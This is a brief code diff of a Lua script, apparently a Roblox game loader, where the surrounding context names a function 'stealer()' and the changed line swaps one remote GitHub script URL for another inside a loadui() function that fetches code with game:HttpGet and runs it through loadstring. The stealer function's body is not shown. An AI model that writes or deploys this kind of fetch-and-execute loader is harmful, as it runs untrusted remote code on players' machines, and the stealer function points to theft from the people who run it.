@@ -6,7 +6,7 @@ local function stealer()
 end
 
 local function loadui()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jinx-Script/new-visual/refs/heads/main/new-visual"))()
 end
 
 -- Run the scripts
